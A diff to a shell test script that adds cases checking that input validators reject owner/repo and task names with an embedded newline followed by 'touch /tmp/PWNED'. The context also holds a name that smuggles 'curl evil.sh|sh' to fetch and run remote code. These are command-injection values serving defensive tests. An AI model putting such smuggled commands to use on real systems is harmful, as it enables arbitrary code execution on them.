@@ -55,6 +55,13 @@ else
   PASS=$((PASS + 1))
 fi
 
+if validate_owner_repo $'acme/repo\ntouch /tmp/PWNED' 2>/dev/null; then
+  FAIL=$((FAIL + 1))
+  echo "FAIL: owner/repo with embedded newline accepted"
+else
+  PASS=$((PASS + 1))
+fi
+
 # --- validate_task_name ---
 if validate_task_name 'my-task_1.2' 2>/dev/null; then
   PASS=$((PASS + 1))
@@ -66,6 +73,13 @@ fi
 if validate_task_name 'x$(curl evil.sh|sh)' 2>/dev/null; then
   FAIL=$((FAIL + 1))
   echo "FAIL: task-name with shell metacharacters accepted"
+else
+  PASS=$((PASS + 1))
+fi
+
+if validate_task_name $'main\ntouch /tmp/PWNED' 2>/dev/null; then
+  FAIL=$((FAIL + 1))
+  echo "FAIL: task-name with embedded newline accepted"
 else
   PASS=$((PASS + 1))
 fi
